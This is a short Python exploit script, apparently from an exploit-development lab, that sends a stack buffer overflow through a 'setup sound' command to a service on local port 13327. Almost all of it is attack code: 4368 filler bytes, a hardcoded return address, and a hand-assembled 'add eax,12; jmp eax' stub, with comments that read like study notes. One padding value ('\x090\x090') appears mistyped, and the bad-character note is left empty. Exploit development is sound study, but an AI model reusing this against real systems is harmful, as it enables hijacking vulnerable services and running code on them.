#!/usr/bin/python
import socket

#nasm > add eax,12
#00000000  83C00C            add eax,byte +0xc
#nasm > jmp eax
#00000000  FFE0              jmp eax

#Fortunately for us, these two sets of instructions take up only 5 bytes of memory
#convert 83C00C and FFE0 to hex below
#\x83\xc0\x0c\xff\xe0
#badchars from video = 

#the five bytes do not covert the 7 bytes we had before with the "C" so we add two nops to keep the same size

host = "127.0.0.1"

ret = "\x97\x45\x13\x08"

crash="\x41" * 4368 + ret + "\x83\xc0\x0c\xff\xe0" + "\x090\x090"

buffer = "\x11(setup sound " + crash + "\x90\x00"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[*]Sending evil buffer..."
s.connect((host, 13327))

data=s.recv(1024)
print data

s.send(buffer)
s.close()

print "[*]Payload Sent !"